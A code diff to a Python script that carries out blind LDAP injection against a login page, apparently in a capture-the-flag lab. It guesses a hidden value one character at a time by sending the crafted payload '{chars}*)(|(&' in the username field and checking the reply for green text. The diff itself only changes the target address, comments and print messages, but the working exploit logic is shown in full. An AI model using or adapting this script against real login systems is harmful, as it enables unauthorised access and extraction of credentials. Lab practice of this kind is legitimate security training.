@@ -11,7 +11,7 @@ import string
 # import time
 
 # URL to target, ex: 'http://insecure-website.com/injectme.php'
-target_url: str = 'http://10.10.233.217/blind.php'
+target_url: str = 'http://10.10.106.199/blind.php'
 
 # Define the character set used for injection:
 char_set = string.ascii_lowercase + string.ascii_uppercase + string.digits + "._!@#$%^&*()"
@@ -30,7 +30,7 @@ while successful_response_found:
 
     for char in char_set:
         # Quick-and-dirty debugging only :-S
-        # print(f"'Trying password character: {char}')
+        # print(f'Trying password character: {char}')
 
         # Adjust data to target the password field, slap payload together
         data = {'username': f'{successful_chars}{char}*)(|(&', 'password': 'pwd)'}
@@ -41,16 +41,18 @@ while successful_response_found:
         # Parse HTML content
         soup = BeautifulSoup(response.content, 'html.parser')
 
-        # Adjust success criteria below as needed
+        # Adjust success criteria below as needed, here: look for the green
+        # "Something is wrong in your password." text in the response:
         paragraphs = soup.find_all('p', style='color: green;')
 
         if paragraphs:
+            # Take note of the character for later and print a message:
             successful_response_found = True
             successful_chars += char
-            print(f'Successful character found: {char}')
+            print(f'[*] Successful character found: {char}')
             break
 
     if not successful_response_found:
-        print('No successful character found in this iteration.')
+        print('[E] No successful character found in this iteration. :(')
 
-print(f"Final successful payload: {successful_chars}")
+print(f'\n[=] Done! Final successful payload: {successful_chars}')
